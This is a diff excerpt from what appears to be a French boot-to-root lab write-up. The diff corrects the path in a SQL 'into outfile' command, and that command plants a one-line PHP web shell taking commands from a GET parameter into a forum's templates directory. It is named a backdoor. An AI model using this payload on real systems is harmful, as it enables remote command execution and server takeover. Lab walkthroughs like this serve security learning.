@@ -140,7 +140,7 @@ GENERATED WORDS: 4612
 ```
 On va essayer de placer notre backdoor dans un de ces repertoires : /forum/templates_c apres avoir cree une nouvelle db que jai nommé b2r
 ```
-select "<?php system($_GET['cmd']); ?>" into outfile "var/www/forum/templates_c/backdoor.php"
+select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
 ```
 
 ![b2r_2](./photos/b2r_2.png)
